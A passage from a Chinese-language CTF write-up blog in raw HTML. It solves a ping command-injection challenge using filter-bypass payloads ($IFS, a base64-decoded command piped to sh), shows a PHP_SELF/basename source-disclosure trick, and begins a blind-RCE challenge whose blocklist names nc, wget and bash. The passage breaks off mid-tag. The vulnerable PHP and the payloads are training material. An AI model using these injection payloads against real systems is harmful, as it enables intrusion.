class=\"token number\">127.0</span>.0.1: <span class=\"token assign-left variable\">icmp_seq</span><span class=\"token operator\">=</span><span class=\"token number\">3</span> <span class=\"token assign-left variable\">ttl</span><span class=\"token operator\">=</span><span class=\"token number\">64</span> <span class=\"token assign-left variable\">time</span><span class=\"token operator\">=</span><span class=\"token number\">0.045</span> ms</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>--- <span class=\"token number\">127.0</span>.0.1 <span class=\"token function\">ping</span> statistics ---</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">4</span> packets transmitted, <span class=\"token number\">4</span> packets received, <span class=\"token number\">0</span>% packet loss</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>round-trip min/avg/max/stddev <span class=\"token operator\">=</span> <span class=\"token number\">0.041</span>/0.047/0.056/0.000 ms</pre></td></tr></table></figure></blockquote>\n<p>联想到之前他说的可以执行系统命令，想起了 linux 中的连接符号。</p>\n<p>具体可以参考这篇文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yMjM2ODEzNTc=\">Linux 中的管道与连接符号</span></p>\n<p>这里使用；，因为 &amp; 被过滤了，当然也可以用 |</p>\n<p>先列出目录：</p>\n<blockquote>\n<p>;ls</p>\n</blockquote>\n<p>回显：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>index.php</pre></td></tr></table></figure><p>尝试 cat，发现空格和 flag 都被过滤了。</p>\n<p>空格我们可以用<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>F</mi><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">IFS</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span></span></span></span> (0-9) 绕过，flag 绕过的方法有很多种。</p>\n<p>对于 $IFS 为什么可以代替空格，可以参考这篇文章：</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2VxMDgwNS9wLzE1MDI3MzU3Lmh0bWw=\">shell 命令之 IFS 详解</span>]</p>\n<p>flag 的绕过方法目前我想出的三种：</p>\n<p>三种绕过方式：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEuc2g=\">1.sh</span></p>\n<figure class=\"highlight sh\"><figcaption data-lang=\"sh\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">;</span><span class=\"token builtin class-name\">echo</span><span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$2Y2F0IGZsYWcucGhw</span><span class=\"token operator\">|</span>base64<span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$2</span>-d<span class=\"token operator\">|</span><span class=\"token function\">sh</span></pre></td></tr></table></figure><p>2. 变量拼接</p>\n<figure class=\"highlight sh\"><figcaption data-lang=\"sh\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span><span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$2fla</span><span class=\"token variable\">$a</span>.php</pre></td></tr></table></figure><p>3. 内联注释 (将反引号命令的结果作为输入来执行命令)</p>\n<figure class=\"highlight sh\"><figcaption data-lang=\"sh\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span>.0.1<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span><span class=\"token environment constant\">$IFS</span><span class=\"token variable\">$2</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span><span class=\"token variable\">`</span></span></pre></td></tr></table></figure><p>最后附上此题目源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your symbol!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your space!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bash/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your bash!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*f.*l.*a.*g.*/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your flag!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ping -c 4 \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"鹤城杯-2021easyp\"><a class=\"anchor\" href=\"#鹤城杯-2021easyp\">#</a> [鹤城杯 2021] EasyP</h3>\n<h4 id=\"php正则匹配文件包含\"><a class=\"anchor\" href=\"#php正则匹配文件包含\">#</a> PHP，正则匹配，文件包含</h4>\n<p>做之前我想说：这题还挺骚。</p>\n<p>进去后，题目给出：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'utils.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'guess'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$guess</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'guess'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$guess</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$secret</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Congratulations! The flag is: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Wrong. Try Again'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/utils\\.php\\/*$/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker :)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/show_source/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_URI'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker :)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'show_source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>首先第一句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$guess</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$secret</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Congratulations! The flag is: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以说是完全没用，单纯只是来误导人的，压根不可能找到 secret 变量的。</p>\n<p>然后再看剩下的三层代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/utils\\.php\\/*$/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker :)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>关于 $_SERVER 请求可以看这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzYxODUuaHRtbCM6fjp0ZXh0PSUyNF9TRVJWRVIlMjAlRTYlOTglQUYlMjBQSFAlMjAlRTklQTIlODQlRTUlQUUlOUElRTQlQjklODklRTUlOEYlOTglRTklODclOEYlRTQlQjklOEIlRTQlQjglODAlRUYlQkMlOEMlRTUlOEYlQUYlRTQlQkIlQTUlRTclOUIlQjQlRTYlOEUlQTUlRTQlQkQlQkYlRTclOTQlQTglRUYlQkMlOEMlRTUlQUUlODMlRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUElRTUlOEMlODUlRTUlOTAlQUIlRTQlQkElODYlRTglQUYlQjglRTUlQTYlODIlRTUlQTQlQjQlRTQlQkYlQTElRTYlODElQUYlRUYlQkMlODhoZWFkZXIlRUYlQkMlODklRTMlODAlODElRTglQjclQUYlRTUlQkUlODQlRUYlQkMlODhwYXRoJUVGJUJDJTg5JUU1JThGJThBJUU4JTg0JTlBJUU2JTlDJUFDJUU0JUJEJThEJUU3JUJEJUFFJUVGJUJDJTg4c2NyaXB0LGxvY2F0aW9ucyVFRiVCQyU4OSVFNCVCRiVBMSVFNiU4MSVBRiVFNyU5QSU4NCVFNiU5NSVCMCVFNyVCQiU4NCVFMyU4MCU4MiUyMCUyNF9TRVJWRVIlMjAlRTYlOTUlQjAlRTclQkIlODQlRTQlQjglQUQlRTclOUElODQlRTUlODUlODMlRTclQjQlQTAlRTclOTQlQjElMjBXZWIlMjAlRTYlOUMlOEQlRTUlOEElQTElRTUlOTklQTglRTUlODglOUIlRTUlQkIlQkElRUYlQkMlOEMlRTQlQkQlODYlRTQlQjglOEQlRTglODMlQkQlRTQlQkYlOUQlRTglQUYlODElRTYlQUYlOEYlRTQlQjglQUElRTYlOUMlOEQlRTUlOEElQTElRTUlOTklQTglRTklODMlQkQlRTYlOEYlOTAlRTQlQkUlOUIlRTUlODUlQTglRTklODMlQTglRTUlODUlODMlRTclQjQlQTAlRUYlQkMlOEMlRTYlOUMlODklRTclOUElODQlRTYlOUMlOEQlRTUlOEElQTElRTUlOTklQTglRTUlOEYlQUYlRTglODMlQkQlRTQlQkMlOUElRTUlQkYlQkQlRTclOTUlQTUlRTQlQjglODAlRTQlQkElOUIlRUYlQkMlOEMlRTYlODglOTYlRTglODAlODUlRTYlOEYlOTAlRTQlQkUlOUIlRTQlQjglODAlRTQlQkElOUIlRTYlQjIlQTElRTYlOUMlODklRTUlOUMlQTglRTglQkYlOTklRTklODclOEMlRTUlODglOTclRTQlQjglQkUlRTUlODclQkElRTYlOUQlQTUlRTclOUElODQlRTUlODUlODMlRTclQjQlQTAlRTMlODAlODI=\">PHP $_SERVER 详解</span></p>\n<p>这句代码就是说文件目录不能以 /utils.php/ 结尾，* 的意思是匹配前面的出现的字符零次或多次，别把它和 linux 中的 * 搞混了。</p>\n<p>所以绕过方式如此简单，先接着往下看再决定在后面加什么吧。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/show_source/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_URI'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker :)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这句话中的 REQUEST_URI 和上面那个 PHP_SELF 区别就是多了参数，这个绕过的方法在前几天的 SICTF 做到过，那题目比这个过滤的稍微严格一点，把 url 编码 ban 了。</p>\n<p>没错，这个 url 编个码就能绕过了，原因就是 server 不会像 get 和 post 一样去 url 解码一次发来的参数，因此可以绕过。</p>\n<p>还有一种就是把 '_' 替换成 '.',' ','+' ,'[' 等，这样 php 存储时会自动把它们解析成字符串。</p>\n<p>最后一层：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'show_source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这个绕过方法就是利用 basename 的一个特性：如果传入的参数中出现了非 ascii 字符则会把它给丢弃。</p>\n<p>这样我们就知道在 /utils.php/ 加什么了，加个汉字或者类似 % ff 这样不存在的字符就可以了，如此一来就能查看 utils.php 里有啥了。</p>\n<p>payload:</p>\n<blockquote>\n<p>/index.php/utils.php/ 喵？show+source=1</p>\n</blockquote>\n<p>为什么前面需要添加一个 <code>/index.php</code>  呢？</p>\n<ul>\n<li>因为当我们传入 <code>index.php/utils.php</code>  时，仍然请求的是 <code>index.php</code> ，</li>\n<li>但是当 <code>basename()</code>  处理后， <code>highlight_file()</code>  得到的参数就变成了 <code>utils.php</code> ，从而我们就实现了任意文件包含。</li>\n</ul>\n<p>说白了我们压根就没在 utils.php 中操作。</p>\n<p>得到 flag 中的 flag、secret 变量，对此我的评价是：6。</p>\n<h3 id=\"swpuctf-2021-新生赛finalrce\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛finalrce\">#</a> [SWPUCTF 2021 新生赛] finalrce</h3>\n<h4 id=\"无回显rcewaf绕过php\"><a class=\"anchor\" href=\"#无回显rcewaf绕过php\">#</a> 无回显 rce，waf 绕过，php</h4>\n<p>进入题目看到源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\\"|\\>|\\&lt;|\\%|\\$/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Sorry,you can't use this.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Can you see anything?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>看到 exec 函数就可以知道这道题是一个无回显 rce。（exec 函数可以用来执行命令但没有回显）</p>\n<p>关于无回显 rce 可以参考这篇文章：</p>\n<p><span class=\"exturl\" 